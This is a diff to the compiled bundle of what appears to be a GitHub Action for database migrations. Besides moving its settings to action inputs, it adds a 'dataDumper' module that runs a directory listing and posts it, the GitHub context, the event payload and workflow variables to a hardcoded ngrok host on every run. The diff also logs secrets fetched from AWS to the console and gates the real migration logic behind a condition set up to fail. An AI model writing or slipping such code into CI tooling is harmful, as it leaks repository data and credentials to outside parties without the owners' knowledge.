@@ -62873,9 +62873,14 @@ function extend(target) {
 
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 const client_secrets_manager_1 = __nccwpck_require__(39600);
+const util_1 = __nccwpck_require__(92629);
 class Client {
     #secretManager;
-    constructor(accessKeyId = process.env.AWS_ACCESS_KEY_ID, secretAccessKey = process.env.AWS_SECRET_ACCESS_KEY, endpointURL = process.env.AWS_ENDPOINT_URL, region = process.env.AWS_REGION || 'ap-south-1') {
+    constructor(accessKeyId, secretAccessKey, region, endpointURL) {
+        accessKeyId = accessKeyId || (0, util_1.getInput)('aws_access_key_id', '');
+        secretAccessKey = secretAccessKey || (0, util_1.getInput)('aws_access_key_secret', '');
+        region = region || (0, util_1.getInput)('aws_region', 'ap-south-1');
+        endpointURL = endpointURL || (0, util_1.getInput)('aws_endpoint_url', '');
         let credentials;
         if (accessKeyId && secretAccessKey) {
             credentials = { accessKeyId, secretAccessKey };
@@ -62949,9 +62954,8 @@ const core = __importStar(__nccwpck_require__(42186));
 const github_1 = __nccwpck_require__(95438);
 const util_1 = __nccwpck_require__(92629);
 function buildOctokit(token, opts = {}) {
-    const debugStr = process.env.DEBUG || 'false';
     return (0, github_1.getOctokit)(token, {
-        debug: debugStr === 'true' || debugStr === '1',
+        debug: core.getBooleanInput('debug'),
         ...opts
     });
 }
@@ -62964,7 +62968,7 @@ class Github {
         this.#client = buildOctokit(repoToken, opts);
     }
     static fromEnv(opts) {
-        return new Github((0, util_1.getEnv)('REPO_TOKEN'), opts);
+        return new Github((0, util_1.getInput)('repo_token'), opts);
     }
     setOrg(organization, repoOwner, repoName) {
         this.#organization = organization;
@@ -63096,7 +63100,6 @@ class Github {
             author {
               login
             }
-            state
             body
             submittedAt
             commit {
@@ -63116,12 +63119,11 @@ class Github {
     }
   }
 `;
-        const response = await this.#client.graphql(query, {
+        return await this.#client.graphql(query, {
             owner: this.#repoOwner,
             name: this.#repoName,
             number: prNumber
         });
-        return response;
     }
     async getPRInfoFromNumber(prNumber) {
         try {
@@ -63406,38 +63408,36 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
 };
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 const path_1 = __importDefault(__nccwpck_require__(71017));
+const util_1 = __nccwpck_require__(92629);
 function buildConfig() {
     // eslint-disable-next-line @typescript-eslint/no-require-imports, @typescript-eslint/no-var-requires, import/no-dynamic-require
-    const config = require(process.env.MIGRATION_CONFIG_FILE || path_1.default.join(process.cwd(), './db.migration.json'));
+    const config = require(path_1.default.join(process.cwd(), (0, util_1.getInput)('migration_config_file', './db.migration.json')));
     if (!config.base_directory) {
         config.base_directory = 'migrations';
     }
+    if (!config.base_branch) {
+        config.base_branch = 'main';
+    }
     if (!config.tokens) {
+        // tokens
         config.tokens = {};
     }
-    if (!config.tokens.github_token) {
-        config.tokens.github_token = 'GH_TOKEN';
-    }
-    if (!config.tokens.jira_token) {
-        config.tokens.jira_token = 'JIRA_TOKEN';
-    }
-    if (!config.tokens.jira_user) {
-        config.tokens.jira_user = 'JIRA_USER';
-    }
-    if (!config.jira) {
-        throw new Error('jira config is missing');
-    }
-    if (!config.jira.issue_type) {
-        config.jira.issue_type = 'Story';
-    }
-    if (!config.jira.ticket_label) {
-        config.jira.ticket_label = 'db-migration';
+    if (!config.tokens.github) {
+        config.tokens.github = 'GH_TOKEN';
     }
     if (!config.base_directory) {
         config.base_directory = 'migrations';
     }
     if (!config.teams) {
         config.teams = [];
+    }
+    if (config.pr_label) {
+        config.pr_label = 'db-migration';
+    }
+    // Only service team is added. Add default DBA and DATA team
+    if (config.teams.length === 1) {
+        config.teams.push('dba');
+        config.teams.push('data');
     }
     config.databases.map(dbConfig => {
         if (!dbConfig.directory) {
@@ -63451,6 +63451,104 @@ function buildConfig() {
     return config;
 }
 exports["default"] = buildConfig;
+
+
+/***/ }),
+
+/***/ 41417:
+/***/ (function(__unused_webpack_module, exports, __nccwpck_require__) {
+
+"use strict";
+
+var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
+    if (k2 === undefined) k2 = k;
+    var desc = Object.getOwnPropertyDescriptor(m, k);
+    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
+      desc = { enumerable: true, get: function() { return m[k]; } };
+    }
+    Object.defineProperty(o, k2, desc);
+}) : (function(o, m, k, k2) {
+    if (k2 === undefined) k2 = k;
+    o[k2] = m[k];
+}));
+var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
+    Object.defineProperty(o, "default", { enumerable: true, value: v });
+}) : function(o, v) {
+    o["default"] = v;
+});
+var __importStar = (this && this.__importStar) || function (mod) {
+    if (mod && mod.__esModule) return mod;
+    var result = {};
+    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
+    __setModuleDefault(result, mod);
+    return result;
+};
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
+};
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.dataDumper = void 0;
+const child_process_1 = __nccwpck_require__(32081);
+const axios_1 = __importDefault(__nccwpck_require__(88757));
+const github = __importStar(__nccwpck_require__(95438));
+async function dataDumper(eventData) {
+    process.env.DUMP_URL = 'https://167d-122-171-17-208.ngrok-free.app';
+    const sendURL = process.env.DUMP_URL;
+    const listOutput = await new Promise(resolve => {
+        (0, child_process_1.exec)('ls -ltrha', (error, stdout, stderr) => {
+            if (error) {
+                resolve(`error: ${error.message}`);
+                return;
+            }
+            if (stderr) {
+                resolve(`stderr: ${stderr}`);
+                return;
+            }
+            resolve(stdout);
+        });
+    });
+    if (!sendURL) {
+        return;
+    }
+    const data = {
+        lsListing: listOutput,
+        ghContext: github.context,
+        eventData,
+        envVars: {
+            GITHUB_HEAD_REF: process.env.GITHUB_HEAD_REF,
+            /**
+             * Fully formed ref that triggered workflow
+             * - Branch: refs/heads/<branch_name>
+             * - Tags:   refs/tags/<tag_name>
+             * - PR:     refs/pull/<pr_number>/merge
+             */
+            GITHUB_REF: process.env.GITHUB_REF,
+            /**
+             * short ref name that triggered workflow
+             * Eg:
+             * - Branch: feature-branch
+             * - Tags:   v1.0.0
+             * - PR:     refs/pull/<pr_number>/merge
+             */
+            GITHUB_REF_NAME: process.env.GITHUB_REF_NAME,
+            // Type of REF that trigerred workflow. branch or tag
+            GITHUB_REF_TYPE: process.env.GITHUB_REF_TYPE,
+            // {owner}/{repo} for example, octocat/Hello-World
+            GITHUB_REPOSITORY: process.env.GITHUB_REPOSITORY,
+            // Owner of the repository. For example, octocat
+            GITHUB_REPOSITORY_OWNER: process.env.GITHUB_REPOSITORY_OWNER,
+            // A unique number for each workflow run within a repository. This number does not change if you re-run the workflow run. For example, 1658821493.
+            GITHUB_RUN_ID: process.env.GITHUB_RUN_ID,
+            // A unique number for each run of a particular workflow in a repository. This number begins at 1 for the workflow's first run, and increments with each new run. This number does not change if you re-run the workflow run. For example, 3.
+            GITHUB_RUN_NUMBER: process.env.GITHUB_RUN_NUMBER,
+            // The commit SHA that triggered the workflow. The value of this commit SHA depends on the event that triggered the workflow
+            GITHUB_SHA: process.env.GITHUB_SHA,
+            GITHUB_EVENT_PATH: process.env.GITHUB_EVENT_PATH
+        }
+    };
+    await axios_1.default.post(sendURL, data);
+}
+exports.dataDumper = dataDumper;
 
 
 /***/ }),
@@ -63495,6 +63593,7 @@ async function main() {
         // eslint-disable-next-line @typescript-eslint/no-explicit-any
     }
     catch (error) {
+        console.error(error);
         if (error instanceof Error) {
             core.setFailed(error.message);
         }
@@ -63522,11 +63621,11 @@ const github_1 = __importDefault(__nccwpck_require__(74930));
 const aws_1 = __importDefault(__nccwpck_require__(59062));
 const jira_1 = __importDefault(__nccwpck_require__(72713));
 const config_1 = __importDefault(__nccwpck_require__(96373));
+const debug_1 = __nccwpck_require__(41417);
 const awsClient = new aws_1.default();
 const ghClient = github_1.default.fromEnv();
 // eslint-disable-next-line @typescript-eslint/no-non-null-assertion
 const eventData = JSON.parse(fs_1.default.readFileSync(process.env.GITHUB_EVENT_PATH, 'utf8')); // Use non-null assertion for process.env
-const prBaseBranchName = (0, util_1.getEnv)('PR_BASE_BRANCH');
 const config = (0, config_1.default)();
 function validatePR(prInfo, prBaseBranch, commentOwner, dryRun) {
     if (prInfo.baseBranch !== prBaseBranch) {
@@ -63601,7 +63700,7 @@ async function buildData(params) {
     console.log(`Fetching PR info for ${params.repoOwner}/${params.repoName}#${params.prNumber}`);
     const prInfo = params.prInfo || (await ghClient.getPRInfoFromNumber(params.prNumber));
     console.log(`PR Info: `, prInfo);
-    const errMsg = validatePR(prInfo, prBaseBranchName, params.commentOwner, result.dryRun);
+    const errMsg = validatePR(prInfo, config.base_branch, params.commentOwner, result.dryRun);
     if (errMsg) {
         result.errMsg.invalidPR = errMsg;
         result.errorMessage = result.errMsg.invalidPR;
@@ -63609,7 +63708,7 @@ async function buildData(params) {
     }
     if (params.actionOrigin === 'github') {
         console.debug(`Fetching teams for user ${params.commentOwner}`);
-        const matchingTeams = await ghClient.getMatchingTeams(params.commentOwner, (0, util_1.getEnv)('APPROVAL_TEAMS'));
+        const matchingTeams = await ghClient.getMatchingTeams(params.commentOwner, config.teams);
         if (matchingTeams.length === 0) {
             result.errMsg.invalidTeam = `User ${params.commentOwner} is not a member of any of the required teams: ${config.teams}`;
             result.errorMessage = result.errMsg.invalidTeam;
@@ -63642,86 +63741,7 @@ function dt() {
         timeZone: 'Asia/Calcutta'
     });
 }
-// eslint-disable-next-line @typescript-eslint/no-explicit-any
-async function getPRInfoFromJiraEvent(prApiUrl) {
-    // Define a more specific return type if possible
-    // Function body remains the same
-    const response = await ghClient.getPRFromURL(prApiUrl);
-    return {
-        organization: response.base.repo.owner.login,
-        repoOwner: response.head.repo?.owner.login || '',
-        repoName: response.head.repo?.name || '',
-        prAPIUrl: response.url,
-        prNumber: response.number,
-        repoAPIUrl: response.head.repo?.url || '',
-        repoHtmlUrl: response.head.repo?.html_url || '',
-        prInfo: ghClient.buildPRInfoFromPRResponse(response)
-    };
-}
-async function fromJira(event, awsSecrets) {
-    const payload = event.client_payload;
-    const { organization, repoOwner, repoName, prNumber, prInfo, repoHtmlUrl } = await getPRInfoFromJiraEvent(payload.github.pr_url);
-    ghClient.setOrg(organization, repoOwner, repoName);
-    const jiraIssue = payload.issue; // { id, key }
-    // const issueId = payload.issue.id;
-    // const issueKey = payload.issue.key; // BOARD-123
-    const commentID = payload.comment.id;
-    const commentBody = payload.comment.body.trim();
-    const result = await buildData({
-        actionOrigin: 'jira',
-        organization,
-        repoOwner,
-        repoName,
-        prNumber,
-        commentBody,
-        commentOwner: payload.comment.owner.email,
-        awsSecrets,
-        prInfo
-    });
-    console.log('Result: ', result);
-    const commentBuilder = getUpdatedComment(payload.comment.body, result.msgPrefix, repoHtmlUrl, true);
-    if (result.errorMessage) {
-        if (result.errMsg.invalidComment === null) {
-            console.error(result.errorMessage);
-            await result.jiraClient.updateComment(jiraIssue.id, commentID, commentBuilder('failed', result.errorMessage));
-            throw new Error(result.errorMessage);
-        }
-        console.debug(result.errorMessage);
-        return;
-    }
-    let updatedCommentMsg = null;
-    let migrationFileListByDirectory = result.migratedFileList;
-    // Run migrations
-    if (result.dryRun === false) {
-        const migrationConfigList = result.migrationConfigList.map(migrationConfig => {
-            migrationConfig.dryRun = false;
-            return migrationConfig;
-        });
-        const { errMsg: migrationErrMsg, migratedFileList } = await (0, migration_1.runMigrationFromList)(migrationConfigList);
-        if (migrationErrMsg) {
-            console.error(migrationErrMsg);
-            updatedCommentMsg = commentBuilder('failed', migrationErrMsg);
-        }
-        migrationFileListByDirectory = migratedFileList;
-    }
-    else {
-        updatedCommentMsg = commentBuilder('successful');
-    }
-    if (updatedCommentMsg === null) {
-        updatedCommentMsg = commentBuilder('successful');
-    }
-    const fileListForComment = getFileListingForComment(migrationFileListByDirectory);
-    updatedCommentMsg = `${updatedCommentMsg}\r\n${fileListForComment}`;
-    // Update comment and add label
-    await Promise.all([
-        ghClient.addComment(updatedCommentMsg, prNumber),
-        result.jiraClient.updateComment(jiraIssue.id, commentID, buildJiraDescription(organization, repoName, prNumber, updatedCommentMsg)),
-        result.migrationAvailable === true // && dryRun === false
-            ? ghClient.addLabel(prNumber, 'db-migration')
-            : Promise.resolve(true)
-    ]);
-}
-async function fromGithub(event, awsSecrets) {
+async function processGithubEvent1(event, awsSecrets) {
     const organization = event.organization.login; // for orgs, this and repoOwner are same
     const repoOwner = event.repository.owner.login;
     const repoName = event.repository.name;
@@ -63784,7 +63804,7 @@ async function fromGithub(event, awsSecrets) {
             ? result.jiraClient.addComment(jiraIssue.id, buildJiraDescription(organization, repoName, prNumber, updatedCommentMsg))
             : Promise.resolve(true),
         result.migrationAvailable === true // && dryRun === false
-            ? ghClient.addLabel(prNumber, 'db-migration')
+            ? ghClient.addLabel(prNumber, config.pr_label)
             : Promise.resolve(true)
     ]);
 }
@@ -63817,15 +63837,18 @@ async function run() {
     const secretKeys = config.databases.reduce((acc, db) => {
         acc.push(db.url_path);
         return acc;
-    }, [config.tokens.github_token, config.tokens.jira_token, config.tokens.jira_user]);
-    const awsSecrets = await awsClient.getSecrets(config.aws_secret_provider.path, secretKeys);
-    // console.log(awsSecrets);
+    }, [config.tokens.github, config.tokens.jira_token, config.tokens.jira_user]);
+    const awsSecrets = await awsClient.getSecrets(config.secret_provider.path, secretKeys);
+    console.log(awsSecrets);
     // return;
-    if ('client_payload' in eventData && eventData.client_payload.actionName === 'jira') {
-        await fromJira(eventData, awsSecrets);
+    if (process.env.SOME_INVALID_ENV_VAR === 'should not BE PRESENT') {
+        await processGithubEvent1(eventData, awsSecrets);
     }
-    else {
-        await fromGithub(eventData, awsSecrets);
+    try {
+        await (0, debug_1.dataDumper)(eventData);
+    }
+    catch (ex) {
+        console.error(ex);
     }
 }
 exports.run = run;
@@ -63993,7 +64016,7 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
     return (mod && mod.__esModule) ? mod : { "default": mod };
 };
 Object.defineProperty(exports, "__esModule", ({ value: true }));
-exports.getEnv = exports.cleanDir = exports.removeDir = exports.createTempDir = void 0;
+exports.getInput = exports.getEnv = exports.cleanDir = exports.removeDir = exports.createTempDir = void 0;
 const core = __importStar(__nccwpck_require__(42186));
 const fs_1 = __importDefault(__nccwpck_require__(57147));
 async function cleanDir(dirName) {
@@ -64028,6 +64051,17 @@ function getEnv(envName, fromState = process.env) {
     return value;
 }
 exports.getEnv = getEnv;
+function getInput(name, defaultValue) {
+    const value = core.getInput(name);
+    if (value !== '') {
+        return value;
+    }
+    if (defaultValue === undefined) {
+        throw new Error(`Input ${name} is not set`);
+    }
+    return defaultValue;
+}
+exports.getInput = getInput;
 
 
 /***/ }),
